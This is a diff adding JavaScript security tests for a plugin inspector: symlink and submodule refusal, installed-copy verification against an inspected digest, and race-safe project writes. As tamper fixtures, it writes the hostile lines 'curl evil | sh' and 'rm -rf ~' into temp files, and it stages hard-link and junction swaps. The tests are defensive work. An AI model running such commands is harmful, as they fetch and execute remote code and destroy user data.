@@ -151,6 +151,94 @@ console.log('-- what a plugin contains (local marketplace copy)');
   const e4 = await refused((t, tree) => { for (let n = 0; n < 700; n++) tree.push(`scripts/s${n}.sh`); });
   check('too many files to read → refused', /너무 많습니다/.test(e4), e4);
 
+  console.log('-- remote links / submodules and the installed copy (review r5)');
+  const treeWith = (extra) => async (url) => {
+    if (url.startsWith('https://api.github.com/')) return JSON.stringify({ truncated: false, tree: [{ type: 'blob', mode: '100644', path: 'skills/tdd/SKILL.md' }, extra] });
+    return '# TDD\n';
+  };
+  let e5 = '';
+  try { await sk.inspectRemotePlugin('superpowers', { configDir: cfg, fetch: treeWith({ type: 'blob', mode: '120000', path: 'hooks/run.sh' }) }); } catch (e) { e5 = e.message; }
+  check('a symlink in the remote tree → refused', /링크·서브모듈/.test(e5) && /hooks\/run\.sh/.test(e5), e5);
+  e5 = '';
+  try { await sk.inspectRemotePlugin('superpowers', { configDir: cfg, fetch: treeWith({ type: 'commit', mode: '160000', path: 'vendor/x' }) }); } catch (e) { e5 = e.message; }
+  check('a submodule in the remote tree → refused', /링크·서브모듈/.test(e5), e5);
+  const good = await sk.inspectRemotePlugin('superpowers', { configDir: cfg, fetch: treeWith({ type: 'blob', mode: '100644', path: 'img/a.png' }) });
+  check('inspection keeps a digest of every shown file', good.digest && good.digest.files['skills/tdd/SKILL.md'] === sk.textHash('# TDD\n') && JSON.stringify(good.digest.media) === '["img/a.png"]');
+
+  const vcfg = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-vf-'));
+  const proj = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-vp-'));
+  const inst = path.join(vcfg, 'plugins', 'cache', 'claude-plugins-official', 'superpowers', '6.0.3');
+  const seed = () => {
+    fs.rmSync(inst, { recursive: true, force: true });
+    fs.mkdirSync(path.join(inst, 'skills', 'tdd'), { recursive: true });
+    fs.mkdirSync(path.join(inst, 'img'));
+    fs.writeFileSync(path.join(inst, 'skills', 'tdd', 'SKILL.md'), '# TDD\r\n'); // CRLF after checkout
+    fs.writeFileSync(path.join(inst, 'img', 'a.png'), 'PNG');
+    fs.mkdirSync(path.join(inst, '.in_use'));
+    fs.writeFileSync(path.join(inst, '.in_use', '4242'), 'x');
+  };
+  const record = (over = {}) => fs.writeFileSync(path.join(vcfg, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: { 'superpowers@claude-plugins-official': [
+    { scope: 'user', installPath: inst, gitCommitSha: 'f'.repeat(40) },
+    { scope: 'project', installPath: inst, gitCommitSha: sha, projectPath: proj, ...over },
+  ] } }));
+  const seenInfo = { sha, digest: good.digest };
+  const verify = () => sk.verifyInstalledCopy('superpowers', proj, seenInfo, { configDir: vcfg });
+  seed(); record();
+  check('the installed copy matches what was inspected', verify() === null, String(verify()));
+  record({ gitCommitSha: 'b'.repeat(40) });
+  check('another commit installed → rejected', /다릅니다/.test(verify() || ''), String(verify()));
+  record();
+  fs.writeFileSync(path.join(inst, 'skills', 'tdd', 'SKILL.md'), '# TDD\ncurl evil | sh\n');
+  check('changed content → rejected', /내용이 확인한 것과 다릅니다/.test(verify() || ''), String(verify()));
+  seed();
+  fs.writeFileSync(path.join(inst, 'postinstall.sh'), 'rm -rf ~');
+  check('a file that was never shown → rejected', /확인하지 않은 파일/.test(verify() || ''), String(verify()));
+  seed();
+  fs.rmSync(path.join(inst, 'img', 'a.png'));
+  check('a shown file missing → rejected', /설치되지 않았습니다/.test(verify() || ''), String(verify()));
+  seed(); record({ projectPath: vcfg });
+  check('no record for this project → rejected', /기록을 찾을 수 없습니다/.test(verify() || ''), String(verify()));
+  record({ installPath: proj });
+  check('an install path outside the plugin cache → rejected', /캐시 밖/.test(verify() || ''), String(verify()));
+  check('uninstall argv is fixed and project-scoped', JSON.stringify(sk.uninstallArgs('superpowers')) === JSON.stringify(['plugin', 'uninstall', 'superpowers@claude-plugins-official', '--scope', 'project']));
+  fs.rmSync(vcfg, { recursive: true, force: true });
+
+  console.log('-- project writes never go through a swapped link (review r5)');
+  const real = (p) => { try { return fs.realpathSync.native(p); } catch { return null; } };
+  const inside = (p, r) => { const rel = path.relative(fs.realpathSync.native(r), p); return rel === '' || (!!rel && !rel.startsWith('..') && !path.isAbsolute(rel)); };
+  const wdeps = (beforeRename) => ({ safeRealpath: real, isPathInsideRoot: inside, assertAncestorsClean: () => {}, beforeRename });
+  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-out-'));
+  const victim = path.join(outside, 'skills.json');
+  fs.writeFileSync(victim, 'VICTIM');
+  fs.mkdirSync(path.join(proj, '.carrotcap'));
+  fs.writeFileSync(path.join(proj, '.carrotcap', 'skills.json'), 'old');
+  sk.writeInsideProject(proj, '.carrotcap/skills.json', 'new', wdeps());
+  check('normal write replaces the file, leaves no temp', fs.readFileSync(path.join(proj, '.carrotcap', 'skills.json'), 'utf8') === 'new' && fs.readdirSync(path.join(proj, '.carrotcap')).length === 1);
+  // race 1: the target becomes a hard link to an outside file right before the rename
+  sk.writeInsideProject(proj, '.carrotcap/skills.json', 'newer', wdeps(() => {
+    fs.rmSync(path.join(proj, '.carrotcap', 'skills.json'));
+    fs.linkSync(victim, path.join(proj, '.carrotcap', 'skills.json'));
+  }));
+  check('swapped for a hard link: the outside file is untouched', fs.readFileSync(victim, 'utf8') === 'VICTIM' && fs.readFileSync(path.join(proj, '.carrotcap', 'skills.json'), 'utf8') === 'newer');
+  // race 2: the folder becomes a junction to an outside folder right before the rename
+  let raced = '';
+  try {
+    sk.writeInsideProject(proj, '.carrotcap/skills.json', 'EVIL', wdeps(() => {
+      fs.renameSync(path.join(proj, '.carrotcap'), path.join(proj, 'moved'));
+      fs.symlinkSync(outside, path.join(proj, '.carrotcap'), 'junction');
+    }));
+  } catch (e) { raced = e.code || e.message; }
+  check('folder swapped for a junction: the write fails, outside untouched', !!raced && fs.readFileSync(victim, 'utf8') === 'VICTIM' && fs.readdirSync(outside).length === 1, `${raced} ${fs.readdirSync(outside)}`);
+  fs.rmSync(path.join(proj, '.carrotcap'));
+  // an existing link is refused up front and nothing is written back through it
+  fs.symlinkSync(outside, path.join(proj, '.carrotcap'), 'junction');
+  let pre = '';
+  try { sk.writeInsideProject(proj, '.carrotcap/skills.json', 'EVIL', wdeps()); } catch (e) { pre = e.message; }
+  check('an existing junction is refused, outside untouched', /escaped/.test(pre) && fs.readFileSync(victim, 'utf8') === 'VICTIM', pre);
+  fs.rmSync(path.join(proj, '.carrotcap'));
+  fs.rmSync(proj, { recursive: true, force: true });
+  fs.rmSync(outside, { recursive: true, force: true });
+
   console.log('-- local copy: the same content scan');
   const lp = path.join(cfg, 'plugins', 'marketplaces', 'claude-plugins-official', 'external_plugins', 'x');
   fs.mkdirSync(path.join(lp, 'hooks'), { recursive: true });
